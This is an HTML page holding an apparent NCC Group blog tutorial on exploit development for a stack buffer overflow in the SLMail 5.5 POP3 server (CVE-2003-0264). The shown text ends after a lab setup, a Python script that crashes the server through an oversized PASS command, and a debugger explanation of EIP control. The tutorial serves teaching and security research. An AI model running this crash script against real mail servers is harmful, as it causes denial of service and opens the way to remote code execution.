<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">

<title>Writing Exploits for Win32 Systems from Scratch &#8211; NCC Group Research</title>
<script type="text/javascript">
  WebFontConfig = {"google":{"families":["PT+Sans:r:latin,latin-ext","PT+Sans:r,i,b,bi:latin,latin-ext"]}};
  (function() {
    var wf = document.createElement('script');
    wf.src = 'https://research.nccgroup.com/wp-content/mu-plugins/wpcomsh/vendor/automattic/custom-fonts/js/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
	})();
</script><style id="jetpack-custom-fonts-css">.wf-active code, .wf-active kbd, .wf-active pre, .wf-active samp{font-family:"PT Sans",sans-serif}.wf-active body{font-family:"PT Sans",sans-serif}.wf-active button, .wf-active input, .wf-active select{font-family:"PT Sans",sans-serif}.wf-active textarea{font-family:"PT Sans",sans-serif}.wf-active blockquote{font-family:"PT Sans",sans-serif}.wf-active code, .wf-active kbd, .wf-active pre, .wf-active tt, .wf-active var{font-family:"PT Sans",sans-serif}.wf-active .button, .wf-active .more-link, .wf-active button:not(.menu-toggle), .wf-active input[type="button"], .wf-active input[type="reset"], .wf-active input[type="submit"], .wf-active .posts-navigation .nav-links a, .wf-active #content #infinite-handle span button{font-family:"PT Sans",sans-serif}.wf-active input[type="email"], .wf-active input[type="password"], .wf-active input[type="search"], .wf-active input[type="text"], .wf-active input[type="url"], .wf-active textarea{font-family:"PT Sans",sans-serif}.wf-active .post-navigation{font-family:"PT Sans",sans-serif}.wf-active .main-navigation{font-family:"PT Sans",sans-serif}.wf-active .entry-content, .wf-active .entry-summary, .wf-active .page-content{font-family:"PT Sans",sans-serif}.wf-active .entry-content .subtitle{font-family:"PT Sans",sans-serif}.wf-active #comments{font-family:"PT Sans",sans-serif}.wf-active .comment-form label{font-family:"PT Sans",sans-serif}.wf-active .comment-form span.required{font-family:"PT Sans",sans-serif}.wf-active .widget_recent_entries span.post-date{font-family:"PT Sans",sans-serif}.wf-active .site-description{font-family:"PT Sans",sans-serif}.wf-active .site-posted-on time{font-family:"PT Sans",sans-serif}.wf-active .page-header:not(.page-header-light) .taxonomy-description{font-family:"PT Sans",sans-serif}.wf-active .light-text{font-family:"PT Sans",sans-serif}.wf-active .site-info{font-family:"PT Sans",sans-serif}.wf-active .sticky-label{font-family:"PT Sans",sans-serif}.wf-active .post-details, .wf-active .post-details a{font-family:"PT Sans",sans-serif}.wf-active .page-links{font-family:"PT Sans",sans-serif}.wf-active .post-edit-link{font-family:"PT Sans",sans-serif}.wf-active .post-author-card .author-description{font-family:"PT Sans",sans-serif}.wf-active #tinymce h1, .wf-active #tinymce h2, .wf-active #tinymce h3, .wf-active #tinymce h4, .wf-active #tinymce h5, .wf-active #tinymce h6, .wf-active .comment-content h1, .wf-active .comment-content h2, .wf-active .comment-content h3, .wf-active .comment-content h4, .wf-active .comment-content h5, .wf-active .comment-content h6, .wf-active .entry-content h1, .wf-active .entry-content h2, .wf-active .entry-content h3, .wf-active .entry-content h4, .wf-active .entry-content h5, .wf-active .entry-content h6, .wf-active .entry-summary h1, .wf-active .entry-summary h2, .wf-active .entry-summary h3, .wf-active .entry-summary h4, .wf-active .entry-summary h5, .wf-active .entry-summary h6, .wf-active .widget_text h1, .wf-active .widget_text h2, .wf-active .widget_text h3, .wf-active .widget_text h4, .wf-active .widget_text h5, .wf-active .widget_text h6{font-family:"PT Sans",sans-serif;font-style:normal;font-weight:400}.wf-active h1{font-style:normal;font-weight:400}.wf-active h2{font-style:normal;font-weight:400}.wf-active h3{font-style:normal;font-weight:400}.wf-active h4{font-style:normal;font-weight:400}.wf-active h5{font-style:normal;font-weight:400}.wf-active h6{font-style:normal;font-weight:400}.wf-active blockquote h1, .wf-active blockquote h2, .wf-active blockquote h3, .wf-active blockquote h4{font-family:"PT Sans",sans-serif;font-weight:400;font-style:normal}.wf-active div#jp-relatedposts h3.jp-relatedposts-headline em{font-family:"PT Sans",sans-serif;font-style:normal;font-weight:400}.wf-active .comment-reply-title, .wf-active .comments-title{font-family:"PT Sans",sans-serif;font-weight:400;font-style:normal}.wf-active .image-post-title{font-family:"PT Sans",sans-serif;font-weight:400;font-style:normal}.wf-active .page-header:not(.page-header-light) h1{font-style:normal;font-weight:400}.wf-active .entry-title{font-family:"PT Sans",sans-serif;font-style:normal;font-weight:400}.wf-active #post-cover-image .cover-meta .single-post-title{font-family:"PT Sans",sans-serif;font-style:normal;font-weight:400}.wf-active #hero-header .site-title{font-family:"PT Sans",sans-serif;font-style:normal;font-weight:400}.wf-active .site-header .site-title{font-style:normal;font-weight:400}.wf-active .site-header .site-description{font-style:normal;font-weight:400}</style>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//widgets.wp.com' />
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//0.gravatar.com' />
<link rel='dns-prefetch' href='//1.gravatar.com' />
<link rel='dns-prefetch' href='//2.gravatar.com' />
<link rel='dns-prefetch' href='//i0.wp.com' />
<link rel='dns-prefetch' href='//i1.wp.com' />
<link rel='dns-prefetch' href='//i2.wp.com' />
<link rel='dns-prefetch' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="NCC Group Research &raquo; Feed" href="https://research.nccgroup.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="NCC Group Research &raquo; Comments Feed" href="https://research.nccgroup.com/comments/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/research.nccgroup.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='https://research.nccgroup.com/wp-content/plugins/gutenberg/build/block-library/style.css?ver=1616008518' type='text/css' media='all' />
<style id='wp-block-library-inline-css' type='text/css'>
.has-text-align-justify{text-align:justify;}
</style>
<link rel='stylesheet' id='wp-block-library-theme-css'  href='https://research.nccgroup.com/wp-content/plugins/gutenberg/build/block-library/theme.css?ver=1616008518' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-layout-grid-css'  href='https://research.nccgroup.com/wp-content/plugins/layout-grid/style.css?ver=1612174154' type='text/css' media='all' />
<link rel='stylesheet' id='coblocks-frontend-css'  href='https://research.nccgroup.com/wp-content/plugins/coblocks/dist/coblocks-style.css?ver=d491038ff7d61a43598729a4c5ab5aae' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='https://c0.wp.com/p/jetpack/9.5.2/_inc/genericons/genericons/genericons.css' type='text/css' media='all' />
<link rel='stylesheet' id='independent-publisher-2-style-css'  href='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/style.css?ver=5.7' type='text/css' media='all' />
<style id='independent-publisher-2-style-inline-css' type='text/css'>
.comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='independent-publisher-2-block-style-css'  href='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/css/blocks.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='independent-publisher-2-wpcom-style-css'  href='https://research.nccgroup.com/wp-content/themes/independent-publisher-2/inc/style-wpcom.css?ver=5.7' type='text/css' media='all' />
<style id='jetpack-global-styles-frontend-style-inline-css' type='text/css'>
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel='stylesheet' id='social-logos-css'  href='https://c0.wp.com/p/jetpack/9.5.2/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='https://c0.wp.com/p/jetpack/9.5.2/css/jetpack.css' type='text/css' media='all' />
<script type='text/javascript' src='https://c0.wp.com/c/5.7/wp-includes/js/jquery/jquery.min.js' id='jquery-core-js'></script>
<script type='text/javascript' src='https://c0.wp.com/c/5.7/wp-includes/js/jquery/jquery-migrate.min.js' id='jquery-migrate-js'></script>
<link rel="https://api.w.org/" href="https://research.nccgroup.com/wp-json/" /><link rel="alternate" type="application/json" href="https://research.nccgroup.com/wp-json/wp/v2/posts/4356" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://research.nccgroup.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://research.nccgroup.com/wp-includes/wlwmanifest.xml" /> 

<link rel="canonical" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/" />
<link rel='shortlink' href='https://wp.me/pbnf4R-18g' />
<link rel="alternate" type="application/json+oembed" href="https://research.nccgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fresearch.nccgroup.com%2F2016%2F06%2F23%2Fwriting-exploits-for-win32-systems-from-scratch%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://research.nccgroup.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fresearch.nccgroup.com%2F2016%2F06%2F23%2Fwriting-exploits-for-win32-systems-from-scratch%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><meta name="description" content="Introduction This post is aimed at those new to exploit development and wanting to understand the end-to-end process and types of techniques that need to be employed in order to realise a working exploit against a buffer overflow vulnerability. I acknowledge that there are more sophisticated techniques that can be employed in this area however&hellip;" />
	<style id="independent-publisher-2-custom-header-css" type="text/css">
			.site-title,
		.site-description,
		#hero-header #hero-social-navigation {
			clip: rect(1px, 1px, 1px, 1px);
			position: absolute;
		}
		</style>
				<style type="text/css">
				/* If html does not have either class, do not show lazy loaded images. */
				html:not( .jetpack-lazy-images-js-enabled ):not( .js ) .jetpack-lazy-image {
					display: none;
				}
			</style>
			<script>
				document.documentElement.classList.add(
					'jetpack-lazy-images-js-enabled'
				);
			</script>
		<link rel="amphtml" href="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Writing Exploits for Win32 Systems from Scratch" />
<meta property="og:url" content="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/" />
<meta property="og:description" content="Introduction This post is aimed at those new to exploit development and wanting to understand the end-to-end process and types of techniques that need to be employed in order to realise a working e…" />
<meta property="article:published_time" content="2016-06-23T13:37:00+00:00" />
<meta property="article:modified_time" content="2020-12-16T10:00:50+00:00" />
<meta property="og:site_name" content="NCC Group Research" />
<meta property="og:image" content="https://research.nccgroup.com/wp-content/uploads/2020/12/1.png" />
<meta property="og:image:width" content="861" />
<meta property="og:image:height" content="687" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Writing Exploits for Win32 Systems from Scratch" />
<meta name="twitter:image" content="https://research.nccgroup.com/wp-content/uploads/2020/12/1.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<style type="text/css" id="custom-colors-css">.has-header-image .site-title a,.has-header-image .site-title a:visited{color:#fff}@media screen and (max-width:32.374em){.main-navigation ul ul{background:transparent !important}.main-navigation ul ul a{color:inherit !important}}.widget_recent_comments a,.widget_recent_entries a,body,button,input,select,textarea{color:#383838}#infinite-footer .blog-info a:hover,#infinite-footer .blog-credits a:hover{color:#383838}.posts-navigation .nav-links a,.main-navigation ul ul a,.main-navigation>div>ul>li.current-menu-item>ul>li a,.main-navigation>div>ul>li.current_page_item>ul>li a{color:#fff}button:not(.menu-toggle),button:not(.menu-toggle):hover,input[type="button"],input[type="button"]:hover,input[type="reset"],input[type="reset"]:hover,input[type="submit"],input[type="submit"]:hover,.button,.button:hover,#content #infinite-handle span button,#content #infinite-handle span button:hover,.more-link,.more-link:hover,.more-link:visited{color:#fff}.site-main>.hentry:nth-child(n+2),.site .infinite-wrap>.hentry:nth-child(n+2),.entry-author-wrapper,.post-navigation,.comment,.page-links a:hover,.main-navigation li{border-color:#ddd}.site-main>.hentry:nth-child(n+2),.site .infinite-wrap>.hentry:nth-child(n+2),.entry-author-wrapper,.post-navigation,.comment,.page-links a:hover,.main-navigation li{border-color:rgba(221,221,221,.25)}#infinite-footer .blog-info a,#infinite-footer .blog-credits,#infinite-footer .blog-credits a{color:#6d6d6d}.post-details,.post-details a,.post-details a:visited,.post-edit-link a,.post-edit-link a:visited{color:#6e6e6c}.post-tags li:first-child,.jetpack-social-navigation li a:hover,.widget_wpcom_social_media_icons_widget li a:hover,.jetpack-social-navigation li a:focus,.widget_wpcom_social_media_icons_widget li a:focus,.jetpack-social-navigation li a:active,.widget_wpcom_social_media_icons_widget li a:active{color:#515151}.jetpack-social-navigation li a,.widget_wpcom_social_media_icons_widget li a{color:#6d6d6d}.post-navigation .nav-links a:hover,.post-navigation .nav-links a:focus,.post-navigation .nav-links a:active,.entry-author .author-bio,.site-posted-on time,.site-description{color:#6d6d6d}.comment .comment-meta,.comment-form label,.light-text,.light-text a,.light-text a:visited,.widget_rss .rss-date,.widget_rss li>cite{color:#6e6e6c}.light-text a:hover{color:#6e6e6c}body{background-color:#fff}#infinite-footer .container{background-color:#fff}#infinite-footer .container{background-color:rgba(255,255,255,.7)}.post-edit-link a{background-color:#f9f9f9}.entry-author .author-title,.entry-title,.entry-title a,.entry-title a:visited,.site-posted-on strong,.site-title,.site-title a,.site-title a:visited,.entry-title a:hover,.site-title a:hover,h1,h2,h3,h4,h5,h6,.page-header:not(.page-header-light) h1,.comment .comment-meta .comment-author .fn{color:#0a0a0a}.comment-form input[type="email"]:active,.comment-form input[type="email"]:focus,.comment-form input[type="password"]:active,.comment-form input[type="password"]:focus,.comment-form input[type="search"]:active,.comment-form input[type="search"]:focus,.comment-form input[type="text"]:active,.comment-form input[type="text"]:focus,.comment-form input[type="url"]:active,.comment-form input[type="url"]:focus,.comment-form textarea:active,.comment-form textarea:focus,blockquote,input[type="email"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="text"]:focus,input[type="url"]:focus,textarea:focus{border-color:#b72520}.comment .comment-meta .comment-metadata a:hover,.comment-form span.required,.pingback:before,.post-details a:hover,.post-edit-link a:active,.post-edit-link a:focus,.post-edit-link a:hover,.site-info a:hover,.trackback:before,a,a:visited{color:#b72520}.main-navigation>div>ul>li.current-menu-item>a,.main-navigation>div>ul>li.current_page_item>a,a:active,a:focus,a:hover,.page-links a:hover{color:#b72520}.posts-navigation .nav-links a,.main-navigation ul ul{background-color:#b72520}button:not(.menu-toggle),input[type="button"],input[type="reset"],input[type="submit"],.button,#content #infinite-handle span button,.more-link{background-color:#b72520}button:not(.menu-toggle):hover,input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,.button:hover,#content #infinite-handle span button:hover,.more-link:hover{background-color:#8a1c18}</style>
<link rel="icon" href="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/07/cropped-Gwl5Lrim_400x400-1.jpg?fit=32%2C32&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/07/cropped-Gwl5Lrim_400x400-1.jpg?fit=192%2C192&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon" href="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/07/cropped-Gwl5Lrim_400x400-1.jpg?fit=180%2C180&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/07/cropped-Gwl5Lrim_400x400-1.jpg?fit=270%2C270&#038;ssl=1" />
			<style type="text/css" id="wp-custom-css">
				/*
/*--- Set main container max-width so logo and main nav aren't at the screen edge at larger screens / #15809476-hc ck ---*/
#page {
	max-width: 740px;
	margin: 0 auto;
	padding: 3.5em 1.75em 0;
}

@media screen and (min-width: 62em) {
	#page {
		box-sizing: border-box;
		max-width: 1080px;
		margin: 2.625em auto 0;
		padding: 0 1.75em;
	}
}

/*--- Align logo left / #15809476-hc ck ---*/
.site-hero-section {
	float: left;
	padding-left: 6em;
}

/*--- Align main nav right #15809476-hc ck ---*/
nav#site-navigation {
	float: right;
	width: auto;
	clear: none;
	padding-right: 6em;
}

/*--- Remove top margin from logo / #15809476-hc ck ---*/
header#masthead {
	margin-top: 0;
}

/*--- Avoid main content overlap logo and nav / #15809476-hc ck ---*/
div#content-wrapper {
	clear: both;
}

/*--- Hide static homepage title / #15809476-hc ck ---*/
.home h1.entry-title {
	display: none;
}			</style>
		</head>

<body class="post-template-default single single-post postid-4356 single-format-standard wp-custom-logo wp-embed-responsive group-blog custom-colors comment-hidden">

<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<div id="hero-header" class="site-hero-section">
		<header id="masthead" class="site-header" role="banner">
			<div class="inner">
				<div class="site-branding">
					<a href="https://research.nccgroup.com/" class="custom-logo-link" rel="home"><img width="180" height="50" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2019/11/small-ncc-group-logo-red.png?fit=180%2C50&amp;ssl=1" class="custom-logo jetpack-lazy-image" alt="NCC Group Research" data-attachment-id="277" data-permalink="https://research.nccgroup.com/small-ncc-group-logo-red/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2019/11/small-ncc-group-logo-red.png?fit=180%2C50&amp;ssl=1" data-orig-size="180,50" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="(Small NCC Group logo red" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2019/11/small-ncc-group-logo-red.png?fit=180%2C50&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2019/11/small-ncc-group-logo-red.png?fit=180%2C50&amp;ssl=1" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2019/11/small-ncc-group-logo-red.png?fit=180%2C50&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" /></a>
												<p class="site-title"><a href="https://research.nccgroup.com/" rel="home">NCC Group Research</a></p>
													<p class="site-description">Making the world safer and more secure</p>
									</div><!-- .site-branding -->

				
									<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false" id="primary-menu-button">
						Menu					</button><!-- .menu-toggle -->
				
			</div><!-- .inner -->
		</header><!-- #masthead -->
	</div>

				<nav id="site-navigation" class="main-navigation" role="navigation">
			<div class="menu-home-container"><ul id="primary-menu" class="menu"><li id="menu-item-373" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-373"><a href="https://research.nccgroup.com/privacy-notice/">Privacy Notice</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-227"><a href="https://nccgroup.wd3.myworkdayjobs.com/NCC_Group">Careers</a></li>
<li id="menu-item-449" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-449"><a href="https://research.nccgroup.com/category/technical-advisory/">Technical Advisories</a></li>
<li id="menu-item-8894" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8894"><a href="https://research.nccgroup.com/disclosure-policy/">Disclosure Policy</a></li>
<li id="menu-item-5431" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5431"><a href="https://www.nccgroup.com/us/contact-us/"><button>Contact Us</button></a></li>
</ul></div>		</nav><!-- .main-navigation -->
	
	
	
	<div id="content-wrapper" class="content-wrapper">
		<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-4356" class="post-4356 post type-post status-publish format-standard hentry category-reverse-engineering category-tutorial-study-guide category-vulnerability">
			<header class="entry-header">
			<h1 class="entry-title">Writing Exploits for Win32 Systems from Scratch</h1>		</header><!-- .entry-header -->		<div class="entry-meta">
			<span class="byline">
				<a href="https://research.nccgroup.com/author/m4ttlewis/" title="Posts by Matt Lewis" rel="author">Matt Lewis</a>			</span>
							<span class="cat-links">
					<a href="https://research.nccgroup.com/category/reverse-engineering/" rel="category tag">Reverse Engineering</a>, <a href="https://research.nccgroup.com/category/tutorial-study-guide/" rel="category tag">Tutorial/Study Guide</a>, <a href="https://research.nccgroup.com/category/vulnerability/" rel="category tag">Vulnerability</a>				</span><!-- .cat-links -->
			
			
			<span class="published-on">
				<time class="entry-date published" datetime="2016-06-23T13:37:00+00:00">June 23, 2016</time><time class="updated" datetime="2020-12-16T10:00:50+00:00">December 16, 2020</time>			</span>

			<span class="word-count">78 Minutes</span>		</div><!-- .entry-meta -->
	
	<div class="entry-content">
		
<h2>Introduction</h2>



<p>This post is aimed at those new to exploit development and wanting to understand the end-to-end process and types of techniques that need to be employed in order to realise a working exploit against a buffer overflow vulnerability. I acknowledge that there are more sophisticated techniques that can be employed in this area however for those looking to get into exploit development using a well-trodden road and against an older operating system helps simplify some of the concepts presented which aids understanding.</p>



<p>In this post, I will show the reader how to write an exploit for a stack-based buffer overflow vulnerability on a POP3 server called SLMAIL (version 5.5).</p>



<p>For the first version of the exploit, we are going to use a Windows XP SP3 English build with DEP in its default state (DEP is enabled by default for essential Windows programs only on Windows XP). We will then learn how to modify the exploit to work on the same system with DEP enabled, how to bypass ASLR to make the exploit work on a Windows 7 machine, and finally how to create a Metasploit module from our exploit and to customise it to cover different operating systems.</p>



<p>Our test lab consists of:</p>



<ul><li>Windows XP SP3 English virtual machine with IP address 192.168.65.176</li><li>Windows 7 with IP address 192.168.65.177</li><li>Kali Linux with IP address 192.168.65.159</li></ul>



<p>To help us on the development phase we are going to use the following tools:</p>



<ul><li>Immunity Debugger (<a href="https://www.immunityinc.com/products/debugger/" rel="nofollow">https://www.immunityinc.com/products/debugger/</a>)</li><li>Mona.py (<a href="https://github.com/corelan/mona" rel="nofollow">https://github.com/corelan/mona</a>)</li><li>Notepad++</li><li>Metasploit Framework</li></ul>



<h2>First Exploit</h2>



<p>The SLMAIL 5.5 POP3 Server has a public vulnerability (CVE-2003-0264) based on a buffer overflow on the stack that can be triggered by abusing the parameter “password” when a user attempts the authentication process.</p>



<p>This simple Python code triggers the vulnerability and makes the server crash:</p>



<pre class="wp-block-code"><code>import sys
import socket
buffer = 'A' * 6000
HOST = '127.0.0.1'
PORT = 110
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()</code></pre>



<p>In the next screenshot we see the effect of executing such code with the process attached to Immunity Debugger. Note that although the vulnerability is in a network service that we can exploit remotely, we use the same Windows virtual machine to develop the exploit to make things easy.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7725" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/1-9/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=861%2C687&amp;ssl=1" data-orig-size="861,687" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=300%2C239&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=861%2C687&amp;ssl=1" loading="lazy" width="861" height="687" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=861%2C687&#038;ssl=1" alt class="wp-image-7725 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?w=861&amp;ssl=1 861w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=300%2C239&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=768%2C613&amp;ssl=1 768w" data-lazy-sizes="(max-width: 861px) 100vw, 861px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=861%2C687&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7725" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/1-9/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=861%2C687&amp;ssl=1" data-orig-size="861,687" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=300%2C239&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?fit=861%2C687&amp;ssl=1" loading="lazy" width="861" height="687" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=861%2C687&#038;ssl=1" alt="" class="wp-image-7725" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?w=861&amp;ssl=1 861w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=300%2C239&amp;ssl=1 300w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/1.png?resize=768%2C613&amp;ssl=1 768w" sizes="(max-width: 861px) 100vw, 861px" data-recalc-dims="1" /></noscript></figure>



<p>Highlighted in red, we can see that there is an access violation trying to execute the code at the address 41414141. That address is the hexadecimal representation of “AAAA” (four As from our buffer of 6000 As). It is clear that we can control the instruction pointer (EIP), so it is possible to change the program behavior.</p>



<p>Once the vulnerability is known, the next steps to write an exploit for it are listed below:</p>



